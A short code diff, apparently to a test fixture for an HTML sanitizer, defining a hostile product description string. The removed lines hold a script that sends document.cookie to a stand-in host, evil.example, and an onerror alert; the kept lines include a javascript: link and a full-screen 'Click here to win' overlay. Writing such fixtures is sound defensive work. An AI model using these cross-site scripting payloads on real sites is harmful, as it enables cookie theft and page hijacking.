@@ -44,8 +44,8 @@ const NAMES = [
  */
 const HOSTILE_DESCRIPTION =
   '<p>Thrown by <strong>hand</strong> in Bandung.</p>' +
-  '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>' +
-  '<img src="x" onerror="alert(document.domain)">' +
+  '<script>window.pwned = "script"</script>' +
+  '<img src="x" onerror="window.pwned = \'onerror\'">' +
   '<a href="javascript:alert(1)">Care guide</a>' +
   '<p style="position:fixed;inset:0;z-index:9999">Click here to win</p>'
 
